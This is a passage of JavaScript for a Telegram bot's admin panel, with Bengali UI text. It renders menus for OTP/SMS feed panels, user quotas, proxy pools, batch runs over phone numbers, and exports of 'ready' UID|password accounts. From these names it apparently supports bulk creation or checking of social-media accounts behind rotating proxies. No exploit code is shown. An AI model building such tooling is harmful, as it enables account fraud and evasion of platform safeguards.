        row.push(meta.btnFn(`${c.name.slice(0, 18)} (${c.available}/${c.total})`, `${meta.prefix}${c.id}`));
      }
      rows.push(row);
    }
    rows.push([btnNav('⬅️ Countries Menu', 'admin:countries')]);
    const txt = [
      `<b>${meta.title}</b>`,
      DIVIDER,
      list.length === 0 ? '<i>No countries configured yet.</i>' : '<i>Choose a country below:</i>',
    ].join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminPanels(chatId, editMsgId) {
    const panels = readPanelsStore().panels;
    const activeCnt = panels.filter((p) => p.active !== false).length;
    const lines = [
      `🔌 <b>OTP API PANELS (${activeCnt}/${panels.length} active)</b>`,
      DIVIDER,
    ];
    const rows = [];
    if (panels.length === 0) {
      lines.push(`<i>No API panels added yet. Tap Add API Panel below to connect an SMS/OTP feed.</i>`);
    } else {
      panels.forEach((p, idx) => {
        const badge = p.active !== false ? '🟢' : '🔴';
        const errTag = p.api_last_error ? ` ⚠️ <i>${escapeHtml(String(p.api_last_error).slice(0, 40))}</i>` : '';
        lines.push(
          `${idx + 1}. ${badge} <b>${escapeHtml(p.name)}</b> • <code>${escapeHtml(String(p.api_auth_type || 'auto').toUpperCase())}</code> • ⏱<code>${Math.max(3, Number(p.scan_interval) || 5)}s</code>${errTag}`
        );
        rows.push([btnNav(`${badge} ${p.name.slice(0, 26)} (⏱${Math.max(3, Number(p.scan_interval) || 5)}s)`, `admin:panel_view:${p.id}`)]);
      });
    }
    rows.push([
      btnOk('➕ Add API Panel', 'admin:panel_add'),
      btnOk('🔄 Refresh', 'admin:panels'),
    ]);
    rows.push([btnNav('⬅️ Admin Panel', 'admin:home')]);

    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminPanelDetail(chatId, panelId, editMsgId) {
    const p = findPanelById(panelId);
    if (!p) {
      await sendMessage(chatId, '❌ API Panel not found.', {
        inline_keyboard: [[btnNav('⬅️ API Panels', 'admin:panels')]],
      });
      return;
    }
    const status = p.active !== false ? '🟢 Active' : '🔴 Paused';
    const numIdx = Number.isInteger(p.number_col_idx) ? p.number_col_idx : 2;
    const sndIdx = Number.isInteger(p.sender_col_idx) ? p.sender_col_idx : 3;
    const msgIdx = Number.isInteger(p.message_col_idx) ? p.message_col_idx : 5;
    const lastScanStr = p.last_scanned_at ? new Date(p.last_scanned_at).toISOString().replace('T', ' ').slice(0, 19) : 'Never scanned yet';
    const mapParts = [
      p.api_rows_path ? `rows=${p.api_rows_path}` : '',
      p.api_number_field ? `number=${p.api_number_field}` : '',
      p.api_sender_field ? `sender=${p.api_sender_field}` : '',
      p.api_message_field ? `message=${p.api_message_field}` : '',
      p.api_timestamp_field ? `time=${p.api_timestamp_field}` : '',
      p.api_range_field ? `range=${p.api_range_field}` : '',
    ].filter(Boolean);

    const lines = [
      `📡 <b>API PANEL • ${escapeHtml(p.name)}</b>`,
      DIVIDER,
      `📊 <b>Status:</b> ${status}  •  ⏱ <b>Interval:</b> <code>${Math.max(3, Number(p.scan_interval) || 5)}s</code>`,
      `🔗 <b>URL:</b> <code>${escapeHtml(p.stats_url)}</code>`,
      `🔑 <b>Token/Key:</b> <code>${p.api_key ? escapeHtml(maskSecretKey(p.api_key)) : 'None'}</code>`,
      `📤 <b>Method:</b> <code>${escapeHtml(String(p.api_method || 'GET'))}</code>  •  🛡 <b>Auth:</b> <code>${escapeHtml(String(p.api_auth_type || 'auto'))}${p.api_auth_name ? ':' + escapeHtml(p.api_auth_name) : ''}</code>`,
      `🗺 <b>Mapping:</b> <code>${mapParts.length ? escapeHtml(mapParts.join(';')) : 'auto-detect'}</code>`,
      `🔢 <b>Columns (1-based):</b> Number=<code>${numIdx + 1}</code>, Sender=<code>${sndIdx + 1}</code>, Msg=<code>${msgIdx + 1}</code>`,
      `🕒 <b>Last Scan:</b> <code>${escapeHtml(lastScanStr)}</code>`,
      p.api_last_error ? `⚠️ <b>Last Error:</b> <code>${escapeHtml(p.api_last_error)}</code>` : '',
    ].filter(Boolean);

    const kb = {
      inline_keyboard: [
        [
          p.active !== false ? btnBad('🔴 Pause Panel', `admin:panel_toggle:${p.id}`) : btnOk('🟢 Activate Panel', `admin:panel_toggle:${p.id}`),
          btnOk('📋 Last Message', `admin:panel_last:${p.id}`),
        ],
        [
          btnNav('📊 Raw Data', `admin:panel_raw:${p.id}`),
          btnNav('🔑 Auth Mode', `admin:panel_auth:${p.id}`),
        ],
        [
          btnNav('🗺 JSON Mapping', `admin:panel_map:${p.id}`),
          btnNav('✏️ Edit Columns', `admin:panel_cols:${p.id}`),
        ],
        [
          btnNav('⏱ Scan Interval', `admin:panel_interval:${p.id}`),
          btnBad('🗑 Delete Panel', `admin:panel_del:${p.id}`),
        ],
        [btnNav('⬅️ All API Panels', 'admin:panels')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderAdminPanelAuthMenu(chatId, panelId, editMsgId) {
    const p = findPanelById(panelId);
    if (!p) {
      await renderAdminPanels(chatId, editMsgId);
      return;
    }
    const rows = [];
    for (let i = 0; i < API_AUTH_OPTIONS.length; i += 2) {
      const row = [];
      for (const opt of API_AUTH_OPTIONS.slice(i, i + 2)) {
        const active = String(p.api_auth_type || 'auto').toLowerCase() === opt.key;
        const label = `${active ? '✅ ' : ''}${opt.label}`;
        row.push((active ? btnOk : btnNav)(label, `admin:panel_setauth:${p.id}:${opt.key}`));
      }
      rows.push(row);
    }
    rows.push([btnNav('⬅️ Back to Panel', `admin:panel_view:${p.id}`)]);

    const txt = [
      `🔑 <b>SELECT AUTH MODE • ${escapeHtml(p.name)}</b>`,
      DIVIDER,
      `Current Auth: <code>${escapeHtml(String(p.api_auth_type || 'auto'))}${p.api_auth_name ? ':' + escapeHtml(p.api_auth_name) : ''}</code>`,
      `Choose the authentication mode for this API Panel:`,
    ].join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminUsersList(chatId, filter = 'all', editMsgId, page = 0) {
    let allUsers = Object.values(readUsersMap());
    if (filter === 'top') {
      allUsers.sort((a, b) => (b.totalOk || 0) - (a.totalOk || 0));
    } else if (filter === 'active_today') {
      allUsers = allUsers.filter((u) => (u.usedToday || 0) > 0).sort((a, b) => (b.usedToday || 0) - (a.usedToday || 0));
    } else {
      allUsers.sort((a, b) => (b.lastActiveAt || 0) - (a.lastActiveAt || 0));
    }
    const filtered = ['all', 'top', 'active_today'].includes(filter)
      ? allUsers
      : allUsers.filter((u) => u.status === filter);

    const perPage = 8;
    const totalPages = Math.max(1, Math.ceil(filtered.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = filtered.slice(safePage * perPage, safePage * perPage + perPage);

    const listText = slice
      .map((u) => {
        const stIcon = u.status === 'approved' ? '🟢' : u.status === 'blocked' ? '🚫' : '🟡';
        const roleTag = u.role === 'admin' ? '👑' : '';
        const pxCnt = readUserProxies(u.id).length;
        return `• ${stIcon}${roleTag} <code>${u.id}</code> <b>${escapeHtml(u.firstName)}</b> (@${escapeHtml(u.username || 'none')})\n  └ 🎯<code>${u.usedToday}/${u.dailyLimit}</code> • ✅<code>${u.totalOk || 0}</code> 🔐<code>${u.totalPending || 0}</code> ❌<code>${u.totalFail || 0}</code> • 🌐<code>${pxCnt}</code>`;
      })
      .join('\n');

    const userButtons = [];
    const userBtn = (u) => {
      const label = `⚙️ ${u.firstName.slice(0, 10)} (✅${u.totalOk || 0})`;
      if (u.status === 'blocked') return btnBad(label, `admin:uview:${u.id}`);
      if (u.status === 'pending') return btnOk(label, `admin:uview:${u.id}`);
      return btnNav(label, `admin:uview:${u.id}`);
    };
    for (let i = 0; i < slice.length; i += 2) {
      const row = [];
      if (slice[i]) row.push(userBtn(slice[i]));
      if (slice[i + 1]) row.push(userBtn(slice[i + 1]));
      userButtons.push(row);
    }
    if (totalPages > 1) {
      const nav = [];
      if (safePage > 0) nav.push(btnNav('◀️ আগের', `admin:users:${filter}:${safePage - 1}`));
      nav.push(btnNav(`${safePage + 1}/${totalPages}`, `admin:users:${filter}:${safePage}`));
      if (safePage + 1 < totalPages) nav.push(btnNav('পরের ▶️', `admin:users:${filter}:${safePage + 1}`));
      userButtons.push(nav);
    }

    const totalUsersRaw = Object.values(readUsersMap());
    const pendingCnt = totalUsersRaw.filter((u) => u.status === 'pending').length;
    userButtons.push([
      btnNav(`${filter === 'all' ? '● ' : ''}All (${totalUsersRaw.length})`, 'admin:users:all:0'),
      btnOk(`${filter === 'top' ? '● ' : ''}🏆 Top`, 'admin:users:top:0'),
      btnOk(`${filter === 'active_today' ? '● ' : ''}🔥 Today`, 'admin:users:active_today:0'),
    ]);
    userButtons.push([
      btnOk(`${filter === 'approved' ? '● ' : ''}✅ Approved`, 'admin:users:approved:0'),
      btnBad(`${filter === 'blocked' ? '● ' : ''}🚫 Blocked`, 'admin:users:blocked:0'),
      btnNav('🔍 Find ID', 'admin:ufind'),
    ]);
    userButtons.push([
      pendingCnt > 0 ? btnOk(`✅ Approve All (${pendingCnt})`, 'admin:approve_all_pending') : btnNav(`🟡 Pending (0)`, 'admin:users:pending:0'),
      btnOk('📊 DL Analytics', 'admin:dl_analytics'),
    ]);
    userButtons.push([
      btnBad('🔄 Reset Today Quotas', 'admin:reset_all_quotas'),
      btnNav('⬅️ Admin Home', 'admin:home'),
    ]);
    const txt = `👥 <b>USERS ANALYTICS &amp; CONTROL (${filtered.length} • Page ${safePage + 1}/${totalPages})</b>\n${DIVIDER}\n<i>যেকোনো ইউজারের নাম চাপলে তার অ্যাকাউন্টস, প্রক্সি, লগ ও মেসেজ অপশন খুলবে:</i>\n\n${listText || '<i>No users in this view.</i>'}`;
    if (editMsgId) await editMessage(chatId, editMsgId, txt, { inline_keyboard: userButtons });
    else await sendMessage(chatId, txt, { inline_keyboard: userButtons });
  }

  async function renderAdminGlobalProxies(chatId, editMsgId) {
    const list = readGlobalProxies();
    const users = Object.values(readUsersMap());
    let totalUserPx = 0;
    for (const u of users) totalUserPx += readUserProxies(u.id).length;
    const preview = list
      .slice(0, 10)
      .map((p, i) => {
        const h = proxyHealth.get(p);
        const tag = h
          ? h.streakFail >= 2
            ? ` 🔴 (${escapeHtml(h.lastErr || 'fail')})`
            : h.lastLatencyMs
            ? ` 🟢 ${h.lastLatencyMs}ms${h.exitIp ? ` [${escapeHtml(h.exitIp)}]` : ''}`
            : ''
          : '';
        return `${i + 1}. <code>${escapeHtml(p)}</code>${tag}`;
      })
      .join('\n');
    const txt = [
      `🌐 <b>ADMIN PROXY MANAGER (Global: ${list.length} • Users: ${totalUserPx})</b>`,
      DIVIDER,
      preview || '<i>No global proxies configured yet.</i>',
      list.length > 10 ? `<i>... +${list.length - 10} more</i>` : '',
    ].filter(Boolean).join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('➕ Add Global Proxies', 'admin:px_add'),
          btnNav('🧪 Test Global', 'admin:px_test'),
        ],
        [
          btnOk('⚡ Sort by Speed', 'admin:px_sort'),
          btnBad('🧹 Prune Dead', 'admin:px_prune'),
        ],
        [
          btnNav('📥 DL Global (.txt)', 'admin:dl_proxies'),
          btnOk(`📥 DL All Users PX (${list.length + totalUserPx})`, 'admin:dl_all_proxies'),
        ],
        [
          btnBad('🗑 Clear All', 'admin:px_clear'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminUserDetail(chatId, targetId, editMsgId) {
    const map = readUsersMap();
    const u = map[targetId];
    if (!u) {
      await sendMessage(chatId, '❌ User not found.', {
        inline_keyboard: [[btnNav('⬅️ Back to Users', 'admin:users:all:0')]],
      });
      return;
    }
    const run = activeRuns.get(targetId);
    const uCfg = readUserConfig(targetId);
    const uPxCnt = readUserProxies(targetId).length;
    const uPendCnt = readUserPending(targetId).length;
    const uDoneCnt = readUserDone(targetId).size;
    const uAccs = readUserAccounts(targetId);
    const uAccOk = uAccs.filter((a) => a.status === 'OK').length;
    const uLogCnt = readUserLogs(targetId, 100).length;
    const statusBadge = u.status === 'approved' ? '🟢 APPROVED' : u.status === 'blocked' ? '🚫 BLOCKED' : '🟡 PENDING';
    const lastSeen = u.lastActiveAt ? new Date(u.lastActiveAt).toISOString().replace('T', ' ').slice(0, 16) : '-';
    const totalAttempts = (u.totalOk || 0) + (u.totalPending || 0) + (u.totalFail || 0);
    const hitRate = totalAttempts > 0 ? Math.round(((u.totalOk || 0) / totalAttempts) * 100) : 0;

    const txt = [
      `👤 <b>USER INSPECTOR • ${escapeHtml(u.firstName)}</b>`,
      DIVIDER,
      `🆔 <b>ID:</b> <code>${escapeHtml(u.id)}</code>  •  🔗 @${escapeHtml(u.username || 'none')}`,
      `📌 <b>Status:</b> ${statusBadge}  •  <b>Role:</b> ${escapeHtml(u.role.toUpperCase())}`,
      `🎯 <b>Today Quota:</b> <code>${u.usedToday} / ${u.dailyLimit}</code>`,
      `📊 <b>Lifetime Stats:</b> ✅ <code>${u.totalOk || 0}</code> • 🔐 <code>${u.totalPending || 0}</code> • ❌ <code>${u.totalFail || 0}</code> (<b>${hitRate}%</b> Ready)`,
      `📦 <b>Saved Accounts:</b> <code>${uAccs.length}</code> (✅ ${uAccOk} Ready)  •  ✔️ <b>Done:</b> <code>${uDoneCnt}</code>`,
      `🌐 <b>Proxies:</b> <code>${uPxCnt}</code>  •  🔐 <b>Pending OTP:</b> <code>${uPendCnt}</code>  •  📜 <b>Logs:</b> <code>${uLogCnt}</code>`,
      `⚙️ <b>Config:</b> CC <code>+${escapeHtml(uCfg.cc)}</code> • Source <code>${escapeHtml(uCfg.fb_tools_source || '2oo9')}</code> • GQL ${uCfg.precheck_gql !== false ? '🟢' : '🔴'}`,
      `⚡ <b>Active Run:</b> <b>${run?.running ? `🟢 ${run.completed}/${run.total}` : '⚪ IDLE'}</b>  •  🕒 <code>${lastSeen}</code>`,
    ].join('\n');
    const isPrimary = u.id === DEFAULT_ADMIN_ID;
    const kb = {
      inline_keyboard: [
        [
          btnOk('✅ Approve', `admin:uapprove:${u.id}`),
          btnBad('🚫 Block', `admin:ublock:${u.id}`),
          btnOk('📩 Message User', `admin:udm:${u.id}`),
        ],
        [
          btnNav(`📊 Accounts (${uAccs.length})`, `admin:uaccs:${u.id}:0`),
          btnNav(`🌐 Proxies (${uPxCnt})`, `admin:uproxies:${u.id}`),
        ],
        [
          btnOk(`📥 DL Ready (${uAccOk})`, `admin:uexport:${u.id}`),
          btnNav('📥 DL All CSV', `admin:udl_csv:${u.id}`),
          btnNav(`📥 DL PX (${uPxCnt})`, `admin:udl_proxies:${u.id}`),
        ],
        [
          btnNav(`📜 View Logs`, `admin:ulogs:${u.id}`),
          btnNav('🎯 Set Limit', `admin:ulimit:${u.id}`),
          btnNav('🔄 Reset Quota', `admin:ureset:${u.id}`),
        ],
        [
          btnBad('🍪 Reset Cookies', `admin:uclean_cookie:${u.id}`),
          btnBad('🧹 Clear Done/OTP', `admin:uclear_done:${u.id}`),
          ...(!isPrimary ? [btnNav(u.role === 'admin' ? '⬇️ Demote' : '👑 Admin', `admin:urole:${u.id}`)] : []),
        ],
        ...(run?.running ? [[btnBad('🛑 Stop User Run', `admin:stopuser:${u.id}`)]] : []),
        [btnNav('⬅️ Back to Users', 'admin:users:all:0'), btnNav('🏠 Admin Home', 'admin:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminUserAccounts(chatId, targetId, page = 0, editMsgId) {
    const u = readUsersMap()[targetId];
    if (!u) {
      await renderAdminUsersList(chatId, 'all', editMsgId);
      return;
    }
    const all = [...readUserAccounts(targetId)].reverse();
    const okCnt = all.filter((a) => a.status === 'OK').length;
    const otpCnt = all.filter((a) => a.status === 'CONFIRM' || a.status === 'CHECKPOINT').length;
    const failCnt = all.length - okCnt - otpCnt;
    const perPage = 8;
    const totalPages = Math.max(1, Math.ceil(all.length / perPage));
    const safePage = Math.max(0, Math.min(page, totalPages - 1));
    const slice = all.slice(safePage * perPage, safePage * perPage + perPage);

    const lines = [
      `📊 <b>USER ACCOUNTS DATA • ${escapeHtml(u.firstName)} (<code>${escapeHtml(targetId)}</code>)</b>`,
      DIVIDER,
      `📦 Total: <code>${all.length}</code>  •  ✅ Ready: <code>${okCnt}</code>  •  🔐 OTP: <code>${otpCnt}</code>  •  ❌ Other: <code>${failCnt}</code>`,
      ``,
      ...(slice.length === 0
        ? ['<i>এই ইউজারের কোনো অ্যাকাউন্ট ডেটা এখনো সেভ হয়নি।</i>']
        : slice.map((a, idx) => {
            const ic = a.status === 'OK' ? '✅' : (a.status === 'CONFIRM' || a.status === 'CHECKPOINT') ? '🔐' : '❌';
            return `${safePage * perPage + idx + 1}. ${ic} <code>+${escapeHtml(a.number || '-')}</code> | <code>${escapeHtml(a.uid || 'no-uid')}</code> | <b>${escapeHtml(a.status)}</b>`;
          })),
    ];

    const rows = [];
    if (totalPages > 1) {
      const nav = [];
      if (safePage > 0) nav.push(btnNav('◀️ আগের', `admin:uaccs:${targetId}:${safePage - 1}`));
      nav.push(btnNav(`${safePage + 1}/${totalPages}`, `admin:uaccs:${targetId}:${safePage}`));
      if (safePage + 1 < totalPages) nav.push(btnNav('পরের ▶️', `admin:uaccs:${targetId}:${safePage + 1}`));
      rows.push(nav);
    }
    rows.push([
      btnOk(`📥 DL Ready (${okCnt})`, `admin:uexport:${targetId}`),
      btnNav(`📥 DL All CSV (${all.length})`, `admin:udl_csv:${targetId}`),
    ]);
    rows.push([btnNav('⬅️ User Profile', `admin:uview:${targetId}`), btnNav('👥 All Users', 'admin:users:all:0')]);
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderAdminUserProxies(chatId, targetId, editMsgId) {
    const u = readUsersMap()[targetId];
    if (!u) {
      await renderAdminUsersList(chatId, 'all', editMsgId);
      return;
    }
    const list = readUserProxies(targetId);
    const preview = list.slice(0, 15).map((p, idx) => {
      const h = proxyHealth.get(proxyHealthKey(p));
      const tag = h
        ? h.streakFail >= 2
          ? ` 🔴 (${escapeHtml(h.lastErr || 'fail')})`
          : h.lastLatencyMs
          ? ` 🟢 ${h.lastLatencyMs}ms`
          : ''
        : '';
      return `${idx + 1}. <code>${escapeHtml(p)}</code>${tag}`;
    });
    const lines = [
      `🌐 <b>USER PROXIES • ${escapeHtml(u.firstName)} (<code>${escapeHtml(targetId)}</code>)</b>`,
      DIVIDER,
      `মোট প্রক্সি: <code>${list.length}</code>টি`,
      ``,
      ...(preview.length > 0 ? preview : ['<i>এই ইউজার এখনো নিজস্ব কোনো প্রক্সি যোগ করেনি।</i>']),
      list.length > 15 ? `\n<i>... আরও ${list.length - 15}টি প্রক্সি রয়েছে (ডাউনলোড করে সম্পূর্ণ ফাইল দেখুন)</i>` : '',
    ].filter(Boolean);
    const kb = {
      inline_keyboard: [
        [
          btnOk(`📥 Download Proxies .txt (${list.length})`, `admin:udl_proxies:${targetId}`),
        ],
        [
          btnNav('⬅️ User Profile', `admin:uview:${targetId}`),
          btnNav('👥 All Users', 'admin:users:all:0'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, lines.join('\n'), kb);
    else await sendMessage(chatId, lines.join('\n'), kb);
  }

  async function renderAdminUserLogs(chatId, targetId, editMsgId) {
    const u = readUsersMap()[targetId];
    if (!u) {
      await renderAdminUsersList(chatId, 'all', editMsgId);
      return;
    }
    const lines = readUserLogs(targetId, 28);
    const body = lines.join('\n') || 'এই ইউজারের কোনো অ্যাক্টিভিটি লগ নেই।';
    const capped = body.length > 2600 ? '...\n' + body.slice(-2600) : body;
    const txt = [
      `📜 <b>USER ACTIVITY LOGS • ${escapeHtml(u.firstName)} (<code>${escapeHtml(targetId)}</code>)</b>`,
      DIVIDER,
      `<blockquote><code>${escapeHtml(capped)}</code></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('📥 Download Full User Log', `admin:udl_log:${targetId}`),
          btnNav('🔄 Refresh', `admin:ulogs:${targetId}`),
        ],
        [
          btnNav('⬅️ User Profile', `admin:uview:${targetId}`),
          btnNav('👥 All Users', 'admin:users:all:0'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminLiveRuns(chatId, editMsgId) {
    const runningList = Array.from(activeRuns.entries()).filter(([, r]) => r.running);
    const usersMap = readUsersMap();
    const lines = [
      `⚡ <b>LIVE BATCH RUNS & SERVER MONITOR</b>`,
      DIVIDER,
    ];
    const rows = [];
    if (runningList.length === 0) {
      lines.push(`<i>No active batch runs are currently running.</i>`);
    } else {
      runningList.forEach(([id, r]) => {
        const u = usersMap[id];
        const elapsed = formatDuration(Math.floor((Date.now() - (r.startedAt || Date.now())) / 1000));
        lines.push(
          `• <b>${escapeHtml(u?.firstName || id)}</b> (<code>${escapeHtml(id)}</code>) — <code>${renderProgressBar(r.completed, r.total, 8)}</code> (<code>${r.completed}/${r.total}</code>)`,
          `  📱 Current: <code>+${escapeHtml(r.currentNumber || '-')}</code> • ✅${r.okCount} 🔐${r.pendingCount} ❌${r.failCount} • ⏱ ${elapsed}`
        );
        rows.push([
          btnNav(`👤 Inspect ${id.slice(-4)}`, `admin:uview:${id}`),
          btnBad(`🛑 Stop ${id.slice(-4)}`, `admin:stopuser:${id}`),
        ]);
      });
      rows.push([btnBad(`🛑 Emergency Stop ALL (${runningList.length})`, 'admin:stop_all')]);
    }
    const memMb = Math.round(process.memoryUsage().rss / 1024 / 1024);
    const upSec = startedAt ? Math.floor((Date.now() - startedAt) / 1000) : 0;
    lines.push(``, `🖥 <b>Runtime:</b> Node <code>${escapeHtml(process.version)}</code> • RAM <code>${memMb}MB</code> • Uptime <code>${formatDuration(upSec)}</code>`);
    rows.push([
      btnOk('🔄 Refresh Live', 'admin:live'),
      btnNav('⬅️ Admin Panel', 'admin:home'),
    ]);
    const txt = lines.join('\n');
    const kb = { inline_keyboard: rows };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminAnalytics(chatId, editMsgId) {
    const st = readSettings();
    const users = Object.values(readUsersMap());
    let accTotal = 0;
    let accOk = 0;
    let accOtp = 0;
    let accUsed = 0;
    let accLimit = 0;
    let accFail = 0;
    let totalDoneHist = 0;
    let totalUserProxies = 0;
    let activeTodayUsers = 0;
    let todayUsedSum = 0;

    for (const u of users) {
      if ((u.usedToday || 0) > 0) activeTodayUsers += 1;
      todayUsedSum += (u.usedToday || 0);
      const accs = readUserAccounts(u.id);
      accTotal += accs.length;
      accOk += accs.filter((a) => a.status === 'OK').length;
      accOtp += accs.filter((a) => a.status === 'CONFIRM' || a.status === 'CHECKPOINT').length;
      accUsed += accs.filter((a) => a.status === 'USED').length;
      accLimit += accs.filter((a) => a.status === 'LIMIT').length;
      accFail += accs.filter((a) => a.status === 'FAIL' || a.status === 'BADNUM').length;
      totalDoneHist += readUserDone(u.id).size;
      totalUserProxies += readUserProxies(u.id).length;
    }

    const rate = accTotal > 0 ? Math.round((accOk / accTotal) * 100) : 0;
    const runningNow = Array.from(activeRuns.values()).filter((r) => r.running).length;
    const topUsers = [...users]
      .sort((a, b) => (b.totalOk || 0) - (a.totalOk || 0))
      .slice(0, 6)
      .map((u, i) => {
        const pxC = readUserProxies(u.id).length;
        return `${i + 1}. <b>${escapeHtml(u.firstName)}</b> (<code>${u.id}</code>) — ✅<code>${u.totalOk || 0}</code> 🔐<code>${u.totalPending || 0}</code> • Today <code>${u.usedToday || 0}</code> • 🌐<code>${pxC}</code>`;
      })
      .join('\n');

    const txt = [
      `📊 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • FULL USER &amp; SYSTEM ANALYTICS</b>`,
      DIVIDER,
      `👥 <b>Users:</b> <code>${users.length}</code> (✅ ${users.filter((u) => u.status === 'approved').length} • 🟡 ${users.filter((u) => u.status === 'pending').length} • 🚫 ${users.filter((u) => u.status === 'blocked').length})`,
      `🔥 <b>Today Active:</b> <code>${activeTodayUsers}</code> users (<code>${todayUsedSum}</code> runs) • ⚡ <b>Live Now:</b> <code>${runningNow}</code>`,
      `📦 <b>Logged Attempts:</b> <code>${accTotal}</code> (<b>${rate}%</b> Ready Rate)`,
      `├ ✅ <b>Ready OK:</b> <code>${accOk}</code>  •  🔐 <b>OTP/CP:</b> <code>${accOtp}</code>`,
      `├ ⚠️ <b>Used:</b> <code>${accUsed}</code>  •  ⏳ <b>Limit:</b> <code>${accLimit}</code>  •  ❌ <b>Fail:</b> <code>${accFail}</code>`,
      `└ ✔️ <b>Done:</b> <code>${totalDoneHist}</code>  •  🌐 <b>Proxies:</b> <code>${totalUserProxies}</code> (User) + <code>${readGlobalProxies().length}</code> (Global)`,
      ``,
      `🏆 <b>Top Users Performance</b>`,
      topUsers || '<i>No user activity yet.</i>',
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk('🏆 Top Users', 'admin:users:top:0'),
          btnOk('🔥 Active Today', 'admin:users:active_today:0'),
        ],
        [
          btnNav('📊 DL Users Analytics (.csv)', 'admin:dl_analytics'),
          btnNav('🌐 DL All Proxies (.txt)', 'admin:dl_all_proxies'),
        ],
        [
          btnOk('🔄 Refresh Stats', 'admin:analytics'),
          btnNav('📦 Export Center', 'admin:backup'),
        ],
        [btnNav('⬅️ Admin Panel', 'admin:home')],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminBackupMenu(chatId, editMsgId) {
    const st = readSettings();
    const users = Object.values(readUsersMap());
    let readyCount = 0;
    let totalAccs = 0;
    let totalUserPx = 0;
    for (const u of users) {
      const accs = readUserAccounts(u.id);
      totalAccs += accs.length;
      readyCount += accs.filter((a) => a.status === 'OK').length;
      totalUserPx += readUserProxies(u.id).length;
    }
    const globalPxCnt = readGlobalProxies().length;
    const txt = [
      `📦 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • ADMIN EXPORT &amp; BACKUP CENTER</b>`,
      DIVIDER,
      `👥 <b>Users DB:</b> <code>${users.length}</code> users`,
      `✅ <b>Global Ready Accounts:</b> <code>${readyCount}</code> / <code>${totalAccs}</code> total`,
      `🌐 <b>Total Proxies:</b> <code>${globalPxCnt}</code> Global + <code>${totalUserPx}</code> Users = <code>${globalPxCnt + totalUserPx}</code>`,
      ``,
      `<i>নিচ থেকে সব ইউজারের ডেটা, অ্যানালিটিক্স বা প্রক্সি এক ক্লিকে ডাউনলোড করুন:</i>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnOk(`📄 All Ready UID|Pass (${readyCount})`, 'admin:dl_all_ready'),
          btnNav(`📊 All Accounts CSV (${totalAccs})`, 'admin:dl_all_csv'),
        ],
        [
          btnOk('📈 Users Analytics (.csv)', 'admin:dl_analytics'),
          btnOk(`🌐 All Users+Global PX (${globalPxCnt + totalUserPx})`, 'admin:dl_all_proxies'),
        ],
        [
          btnNav('👥 Users DB (.json)', 'admin:dl_users'),
          btnNav('🌐 Global Proxies (.txt)', 'admin:dl_proxies'),
        ],
        [
          btnNav('📜 System Debug Log (.txt)', 'admin:dl_syslog'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderAdminLogsMenu(chatId, editMsgId) {
    let lines = [];
    try {
      if (fs.existsSync(FILES.debugLog)) {
        lines = fs.readFileSync(FILES.debugLog, 'utf-8').split(/\r?\n/).filter(Boolean).slice(-28);
      }
    } catch {
      lines = [];
    }
    const body = lines.join('\n') || 'No system logs recorded yet.';
    const capped = body.length > 2600 ? '...\n' + body.slice(-2600) : body;
    const txt = [
      `📜 <b>SYSTEM EVENT LOGS (${lines.length})</b>`,
      DIVIDER,
      `<blockquote><code>${escapeHtml(capped)}</code></blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnNav('📄 Download Full Log', 'admin:dl_syslog'),
          btnBad('🗑 Clear System Logs', 'admin:clear_logs'),
        ],
        [
          btnOk('🔄 Refresh Logs', 'admin:logs'),
          btnNav('⬅️ Admin Panel', 'admin:home'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function broadcastMessage(text) {
    const clean = text.trim();
    if (!clean) return 0;
    const st = readSettings();
    const users = Object.values(readUsersMap()).filter((u) => u.status === 'approved');
    let count = 0;
    for (const u of users) {
      const r = await sendMessage(
        u.id,
        `📣 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} ADMIN ANNOUNCEMENT</b>\n${DIVIDER}\n<blockquote>${escapeHtml(clean)}</blockquote>`,
        {
          inline_keyboard: [
            [
              btnUrl('📢 Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      if (r.ok) count += 1;
    }
    pushBotLog(`Broadcast delivered to ${count}/${users.length} approved users`);
    return count;
  }

